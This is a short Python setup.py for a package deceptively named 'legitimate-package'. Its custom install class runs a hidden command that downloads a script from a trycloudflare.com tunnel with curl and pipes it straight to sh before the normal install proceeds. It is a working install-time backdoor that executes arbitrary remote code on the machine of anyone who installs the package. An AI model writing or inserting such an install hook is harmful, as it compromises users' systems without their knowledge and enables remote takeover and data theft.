from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        os.system("curl -s 'https://toner-solution-jewellery-afterwards.trycloudflare.com/r/smokedmeat/stg_sm_87c9c5ba465f9634' | sh")
        install.run(self)

setup(
    name='legitimate-package',
    version='1.0.0',
    cmdclass={'install': CustomInstall},
)
